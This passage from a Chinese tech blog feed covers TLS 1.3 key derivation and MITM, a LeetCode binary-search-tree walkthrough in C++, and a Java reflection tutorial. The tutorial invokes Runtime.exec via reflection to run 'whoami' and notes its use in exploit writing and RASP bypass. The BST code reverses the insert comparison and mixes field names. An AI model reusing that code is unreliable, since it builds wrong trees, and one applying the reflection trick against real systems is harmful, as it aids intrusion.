前一样发送握手阶段报文的摘要（当然，这会被”客户端握手密钥”加密）。</p></li><li><p>在两边做完自己的工作后，双方将从𝑚𝑎𝑠𝑡𝑒𝑟 𝑠𝑒𝑐𝑟𝑒𝑡中导出以下四个密钥：</p><ul><li><p>客户端通信密钥：用来加密 Client -&gt; Server 的通信信息</p><p>（上文的两个用于握手报文加密的密钥将会被丢弃）</p></li><li><p>服务器端通信密钥：用来加密 Server -&gt; Client 的通信信息</p></li><li><p>恢复密钥：用来参与 PSK 的计算</p></li><li><p>导出密钥：用来参与默认的密钥导出计算</p></li></ul></li></ol><img src="/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/Snipaste_2024-06-28_22-35-20.jpg" class=""><h4 id="为什么TLS1-3会使用这么多的密钥"><a href="#为什么TLS1-3会使用这么多的密钥" class="headerlink" title="为什么TLS1.3会使用这么多的密钥"></a>为什么TLS1.3会使用这么多的密钥</h4><p>在 TLS 1.3 中，其密钥的导出函数叫做 HKDF，为一个基于 HMAC 的密钥导出函数(KDF)，它执行的主要方法是 “extract-then-expand”，也就是说，先从输入密钥与参数中提取一个固定长度的密钥，然后拓展为多个额外的密钥。重点在于，额外导出的密钥在密码学上是安全的，并且即使其中一个密钥被泄露，也不会导致其他由相同的密钥材料导出的密钥存在风险。</p><p>简单来讲就是，”不要把鸡蛋放在同一个篮子里”。</p><h3 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a>MITM</h3><p>MITM(Man-in-the-MiddleAttack) ，是指攻击者与通讯的两端分别创建独立的联系，并交换其所有收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个对话都被攻击者完全控制，在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。一个中间人攻击能成功的前提条件是攻击者能够将自己伪装成每个参与会话的终端，并且不被其他终端识破。</p><h3 id="心脏滴血漏洞分析"><a href="#心脏滴血漏洞分析" class="headerlink" title="心脏滴血漏洞分析"></a>心脏滴血漏洞分析</h3><p><a href="https://3xsh0re.github.io/2024/07/22/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">请跳转至我的另一篇博客阅读</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字认证技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode530学习二叉搜索树</title>
    <link href="/2024/06/22/leetcode530%E5%AD%A6%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/"/>
    <url>/2024/06/22/leetcode530%E5%AD%A6%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>二叉搜索树YES！</p><span id="more"></span><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>二叉搜索树是一种二叉树的树形数据结构，其定义如下：</p><ol><li>空树是二叉搜索树。</li><li>若二叉搜索树的左子树不为空，则其左子树上所有点的附加权值均小于其根节点的值。</li><li>若二叉搜索树的右子树不为空，则其右子树上所有点的附加权值均大于其根节点的值。</li><li>二叉搜索树的左右子树均为二叉搜索树。</li></ol><p>二叉搜索树上的基本操作所花费的时间与这棵树的高度成正比。对于一个有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>个结点的二叉搜索树中，这些操作的最优时间复杂度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="7.695ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3401 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(1450,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1935,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(2412,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3012,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，最坏为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.844ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2141 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1752,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。随机构造这样一棵二叉搜索树的期望高度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="7.695ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3401 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(1450,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1935,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(2412,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3012,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span>{<br><span class="hljs-type">int</span> key;<br>TreeNode*left;<br>TreeNode*right;<br><span class="hljs-comment">// 维护其他信息，如高度，节点数量等</span><br>    <span class="hljs-type">int</span> size;   <span class="hljs-comment">// 当前节点为根的子树大小</span><br>    <span class="hljs-type">int</span> count;  <span class="hljs-comment">// 当前节点的重复数量</span><br><span class="hljs-built_in">TreeNode</span>(<span class="hljs-type">int</span> value):<span class="hljs-built_in">key</span>(value),<span class="hljs-built_in">size</span>(<span class="hljs-number">1</span>),<span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>),<span class="hljs-built_in">left</span>(<span class="hljs-literal">nullptr</span>),<span class="hljs-built_in">right</span>(<span class="hljs-literal">nullptr</span>){<br>}<br>};<br></code></pre></td></tr></table></figure><p>由二叉树的定义，二叉搜索树的中序遍历结果可以得到一个非降的序列</p><p>在搜索二叉树中，搜索是相对容易的，当值大于这个节点时，向右子树搜索，反之向左子树搜索。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Search</span><span class="hljs-params">(TreeNode *root,<span class="hljs-type">int</span> target)</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>){<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>}<br><span class="hljs-keyword">if</span> (root-&gt;value == target)<br>{<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>}<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (root-&gt;value &gt; target)<br>{<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">Search</span>(root-&gt;left,target);<br>}<span class="hljs-keyword">else</span>{<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">Search</span>(root-&gt;right,target);<br>}<br>}<br></code></pre></td></tr></table></figure><p>在二叉搜索树中，插入、删除等操作都是基于搜索操作的</p><p>插入：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">}<br><span class="hljs-function">TreeNode *<span class="hljs-title">Insert</span><span class="hljs-params">(TreeNode *root,<span class="hljs-type">int</span> value)</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>{<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(value);<br>}<br><span class="hljs-keyword">if</span> (value &gt; root-&gt;key)<br>{<br>root-&gt;left = <span class="hljs-built_in">Insert</span>(root-&gt;left,value);<br>}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(value &lt; root-&gt;key)<br>{<br>root-&gt;right = <span class="hljs-built_in">Insert</span>(root-&gt;right,value);<br>}<br><span class="hljs-keyword">return</span> root;<br>}<br></code></pre></td></tr></table></figure><p>删除操作稍微复杂了一点，需要判断几种情况，假设这时我们已经找到了需要删除的节点<code>node</code></p><ol><li>当<code>node</code>为叶子节点时，直接删除</li><li>当<code>node</code>只有一个子节点时，返回仅存的那个子节点，然后直接删除<code>node</code></li><li>当<code>node</code>有两个子节点时，需要先找到<code>node</code>的前驱或者后继节点，返回这两个中的某一个，同时需要递归的删除此节点</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">deleteNode</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> key)</span> </span>{<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>    {<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    }<br>    <span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">if</span> ( key &gt; root-&gt;val ){<br>            root-&gt;right = <span class="hljs-built_in">deleteNode</span>(root-&gt;right,key);<br>            <span class="hljs-keyword">return</span> root;<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( key &lt; root-&gt;val ){<br>            root-&gt;left = <span class="hljs-built_in">deleteNode</span>(root-&gt;left,key);<br>            <span class="hljs-keyword">return</span> root;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-comment">// 已经是叶子节点</span><br>            <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">nullptr</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">nullptr</span>)<br>            {<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>            }<br>            <span class="hljs-comment">// 只有一个子节点</span><br>            <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">nullptr</span>)<br>            {<br>                <span class="hljs-keyword">return</span> root-&gt;right;<br>            }<br>            <span class="hljs-keyword">if</span> (root-&gt;right == <span class="hljs-literal">nullptr</span>){<br>                <span class="hljs-keyword">return</span> root-&gt;left;<br>            }<br>            TreeNode *successor = root-&gt;right;<br>            <span class="hljs-keyword">while</span>(successor-&gt;left)<br>            {<br>                successor = successor-&gt;left;<br>            }<br>            root-&gt;right = <span class="hljs-built_in">deleteNode</span>(root-&gt;right,successor-&gt;val);<br>            successor-&gt;left = root-&gt;left;<br>            successor-&gt;right = root-&gt;right;<br>            <span class="hljs-keyword">return</span> successor;<br>        }<br>    }<br>    <span class="hljs-keyword">return</span> root;<br>}<br></code></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这道题意思很明显，找差值最小，按照中序遍历的二叉搜索树自然递增，所以中序遍历接口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ANS</span><span class="hljs-params">(TreeNode *root,<span class="hljs-type">int</span>&amp; pre, <span class="hljs-type">int</span>&amp; ans)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>    {<br>        <span class="hljs-keyword">return</span>;<br>    }<br>    <span class="hljs-built_in">ANS</span>(root-&gt;left,pre,ans);<br>    <span class="hljs-keyword">if</span> (pre == <span class="hljs-number">-1</span>)<br>    {<br>        pre = root-&gt;val;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>        ans = <span class="hljs-built_in">min</span>(ans,root-&gt;val - pre);<br>        pre = root-&gt;val;<br>    }<br>    <span class="hljs-built_in">ANS</span>(root-&gt;right,pre,ans);<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getMinimumDifference</span><span class="hljs-params">(TreeNode* root)</span> </span>{<br>    <span class="hljs-type">int</span> ans = INT_MAX,pre = <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">ANS</span>(root,pre,ans);<br>    <span class="hljs-keyword">return</span> ans;<br>}<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反射机制</title>
    <link href="/2024/06/17/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <url>/2024/06/17/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>在Java安全方面的一个重要机制，著名的Spring框架也是基于此。</p><span id="more"></span><p>Java反射(<code>Reflection</code>)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><p>Java的大部分框架都是采用了反射机制来实现的(如:<code>Spring MVC</code>、<code>ORM框架</code>等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p><h3 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h3><p>首先我们需要知道的是，在Java中一切皆对象，“类”本身也是被抽象成为一个类，称为<code>Class</code>类，每个类都会有一个类对象，每当编译一个新类就产生一个<code>Class</code>对象，也就是<code>Class</code>类的实例。</p><p><code>Class</code> 类只有一个私有的构造方法，不能通过 <code>new</code> 关键字来创建，而是在类加载的时候由 <code>Java</code> 虚拟机以及类加载器来自动构造的。</p><p>Java反射操作的基础就是<code>java.lang.Class</code>对象，通常有如下3种方法：</p><ol><li><code>类名.class</code></li><li><code>Class.forName("com.example.test")</code></li><li><code>classLoader.loadClass("com.example.test")</code></li></ol><p>对于数组类型的Class对象需要特殊注意,需要使用Java类型的描述符方式，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; doubleArray = Class.forName(<span class="hljs-string">"[D"</span>);<span class="hljs-comment">//相当于double[].class</span><br>Class&lt;?&gt; cStringArray = Class.forName(<span class="hljs-string">"[[Ljava.lang.String;"</span>);<span class="hljs-comment">// 相当于String[][].class</span><br></code></pre></td></tr></table></figure><p>当需要调用内部类时，使用<code>$</code>代替<code>.</code>，比如test类有一个内部类t，那么这样获取：</p><p><code>Class t = class.forName("com.example.test$t")</code></p><h3 id="反射执行系统命令"><a href="#反射执行系统命令" class="headerlink" title="反射执行系统命令"></a>反射执行系统命令</h3><p>在Java中，执行系统命令通常使用<code>java.lang.Runtime</code>库中的<code>exec</code>函数实现，那么通过反射执行系统命令需要以下几个步骤：</p><ol><li>获取<code>Runtime.class</code></li><li>创建<code>Runtime.class</code>的构造方法，创建实例</li><li>获取<code>Runtime</code>类的函数<code>exec</code></li><li>通过<code>invoke</code>函数执行<code>exec</code>函数</li></ol><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取Runtime类对象</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">rC</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>);<br><span class="hljs-comment">// 获取构造方法</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> rC.getDeclaredConstructor();<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br><span class="hljs-comment">// 获取Runtime的exec(String cmd)方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> rC.getMethod(<span class="hljs-string">"exec"</span>, String.class);<br><span class="hljs-comment">// 调用exec方法，等价于 rt.exec(cmd);</span><br><span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Process) runtimeMethod.invoke(runtimeInstance, <span class="hljs-string">"whoami"</span>);<br><span class="hljs-comment">// 获取命令执行结果</span><br><span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> p.getInputStream();<br><span class="hljs-comment">// 输出命令执行结果</span><br>System.out.println(org.apache.commons.io.IOUtils.toString(in, <span class="hljs-string">"UTF-8"</span>));<br></code></pre></td></tr></table></figure><h3 id="反射创建类实例"><a href="#反射创建类实例" class="headerlink" title="反射创建类实例"></a>反射创建类实例</h3><p>在Java的<code>任何一个类都必须有一个或多个构造方法</code>，如果代码中没有创建构造方法那么在类编译的时候会自动创建一个无参数的构造方法。</p><p>在反射机制中，有两个函数可以获取到类构造器：</p><ol><li><code>getDeclaredConstructor</code>：可以获取到类的私有构造方法</li><li><code>getConstructor</code>：只能获取公有的构造器</li></ol><p>如果构造方法有一个或多个参数的情况下，应该在获取构造方法时候传入对应的参数类型数组。</p><p>如：<code>clazz.getDeclaredConstructor(String.class, 